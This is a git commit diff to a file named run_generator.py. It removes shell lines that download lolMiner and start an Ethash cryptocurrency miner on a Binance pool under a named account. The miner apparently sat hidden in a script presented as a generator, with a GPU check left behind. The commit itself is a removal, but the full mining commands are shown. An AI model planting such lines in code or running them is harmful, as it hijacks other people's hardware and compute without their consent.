3964110202a31ac935de00bc8b02f8b3dd8a2f7d
kitcolab001 <92324066+kitcolab001@users.noreply.github.com>
2021-10-11 13:14:42 -0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,6 +1,2 @@
 import os as alpha
 alpha.system("nvidia-smi")
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz
-tar -xf lolMiner_v1.32a_Lin64.tar.gz
-cd 1.32a/
-./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user VALBU10.VINI1 --ethstratum ETHPROXY
